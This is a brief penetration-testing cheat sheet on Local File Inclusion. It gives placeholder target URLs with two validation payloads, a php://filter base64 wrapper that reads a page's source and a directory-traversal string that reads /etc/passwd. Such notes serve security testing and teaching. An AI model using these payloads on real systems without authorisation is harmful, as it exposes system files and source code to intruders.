# LFI = Local File Inclusion
Example scenario:   
```bash
http://<target>/index.php?parameter=value
```

Validate LFI:   
```bash
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
# OR
http://<target>/index.php?page=../../../../../../../../etc/passwd
```

